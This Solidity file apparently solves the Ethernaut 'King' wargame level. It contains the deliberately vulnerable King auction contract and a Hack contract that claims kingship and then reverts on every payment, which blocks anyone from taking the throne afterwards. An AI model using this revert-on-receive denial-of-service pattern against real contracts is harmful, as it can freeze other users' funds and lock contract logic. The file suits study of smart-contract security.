// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    address king;
    uint public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}

contract Hack {
    King king;

    constructor(address _king) payable {
        king = King(payable(_king));
        (bool success, ) = payable(king).call{value: msg.value}("");
        require(success, "bid failed");
    }

    fallback() external {
        revert();
    }
}
